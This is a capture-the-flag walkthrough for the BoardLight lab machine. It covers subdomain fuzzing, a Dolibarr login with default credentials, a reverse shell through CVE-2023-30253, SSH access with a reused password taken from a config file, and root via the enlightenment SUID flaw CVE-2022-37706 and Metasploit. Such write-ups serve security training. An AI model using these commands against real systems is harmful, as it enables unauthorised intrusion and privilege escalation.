Enumeration

The first thing I did was scan the target with nmap -A 10.10.11.11.

I saw that port 22 and port 80 were open. I connected to the web server using the IP without modifying the /etc/hosts file and it loaded a page. I looked for vulnerabilities but didn't find anything. Next, I tried to fuzz for directories, but I still got no useful results. Then I decided to look for subdomains and vhosts. I then added IP BoardLight.htb to /etc/hosts, but that name was wrong and I got no results again.

At the end of the web page I found this name Board.htb so I added this name to /etc/hosts.

Which was the right thing.
10.10.11.11 board.htb

The vhost I found was crm.

I used the command ffuf -w ~/Downloads/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://board.htb/ -H 'Host: FUZZ.board.htb' -fs 15949.

Foothold

Next, I added the vhost to my /etc/hosts file: 10.10.11.11 crm.board.htb. This opened a login page. I tried the credentials below, and these were the right ones. Once logged in, I looked for Dolibarr exploits and found CVE-2023-30253, with an exploit.py script to get a reverse shell.

Credentials admin : admin

I opened a listener with netcat -lvnp 4444 and ran python3 exploit.py --url http://crm.board.htb -u admin -p admin -r My_IP 4444, and I got the reverse shell.

I upgraded the shell with these commands:

python3 -c 'import pty; pty.spawn("/bin/bash")' #Press Ctrl + Z stty raw -echo ; fg reset screen export TERM=xterm export SHELL=bash stty rows 40 columns 100

User Access

After searching for a while, I found the name of a user in /etc/passwd: larissa.

In ~/html/crm.board.htb/htdocs/conf, I found a conf.php file generated by Dolibarr.

The password for dolibarrowner was serverfun2$2023!!. This was also the password for SSH with the larissa user.

Credentials dolibarrowner : serverfun2$2023!!
larissa : serverfun2$2023!!

So I connected with ssh larissa@10.10.11.11 and the password serverfun2$2023!!. There I got the user flag.

Privilege Escalation

Now we can start searching for local privilege escalation. I used this command:

find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

We can find some non-default SUID binaries.

-rwsr-xr-x 1 root root 26944 Jan 29 2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys -rwsr-xr-x 1 root root 14648 Jan 29 2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd -rwsr-xr-x 1 root root 14648 Jan 29 2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight

By searching the web we can see that a CVE-2022-37706 exists.

We copy the exploit.sh file and we set it on the larissa SSH session to get root access.

vi exploit.sh (paste the exploit and close the vi with :qw ) chmod +x exploit.sh ./exploit.sh

And we get the root.

Root Flag [REDACTED]

There is also another way to get root with linpeas and msfconsole.

The first thing I did was send linpeas over:

scp linpeas.sh larissa@10.10.11.11:~

Now larissa has linpeas.sh in her home directory. (I could have put it in /tmp instead, but since this is a lab machine, it doesn't matter.)

I made it executable with chmod +x linpeas.sh, then ran it with ./linpeas.sh.

From my machine, I opened msfconsole and searched:

msf6 > search auxiliary/scanner/ssh/ssh_login

I used the auxiliary module and set the options (username, password, RHOST).

I found CVE-2022-37706, so I decided to try it.

I set the options and ran the exploit. I got a meterpreter session. I used shell, then went straight to cd /root, where I found root.txt.
